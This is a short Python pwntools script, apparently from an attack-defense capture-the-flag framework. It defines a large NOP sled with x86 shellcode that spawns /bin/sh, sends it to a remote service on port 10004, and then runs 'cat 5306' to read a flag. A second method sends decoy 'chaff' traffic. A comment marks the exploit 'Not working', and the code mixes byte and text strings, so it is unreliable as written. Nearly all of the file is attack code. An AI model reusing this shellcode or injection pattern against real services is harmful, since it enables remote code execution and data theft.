#!/usr/bin/env python3

from Base_Exploit import Exploit
from pwn import *
import pwn

STR = b"\x90"*100000 + "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x16\x58\xd1\xe8\xcd\x80\x3a\xc5\xb5\xff\x3a\xc5\xb5\xff\x3a\xc5\xb5\xff\x3a\xc5\xb5\xff\x3a\xc5\xb5\xff\x3a\xc5\xb5\xff\x3a\xc5\xb5\xff\x3a\xc5\xb5\xff\x3a\xc5\xb5\xff\x3a\xc5\xb5\xff\x3a\xc5\xb5\xff\x3a\xc5\xb5\xff"
#example Exploit4**************Not working***********
class Exploit4(Exploit):
    def __init__(self, ip, port,flagid, name="", debug=False, debug_chaff=False):
        super().__init__(ip, port, flagid,name, debug, debug_chaff)

    def launch_exploit(self):
        context.log_level = 'debug'
        r = pwn.remote(self.ip, 10004)
        r.recvline()
        r.sendline("R")
        r.recvline()
        r.sendline(b"5306 " + STR)
        r.recvline()
        r.sendline("cat 5306")
        test = r.recvline()
        self.dprint(test)
        r.send("exit")
        r.close()
        
    def launch_chaff(self):
        msg = b"<x90>"*100 + "<xb5><xff><x3a><xc5><xb5><xff>"
        self.dprint(msg)
        self.write_file(msg)
        self.send(msg,self.sock)

   


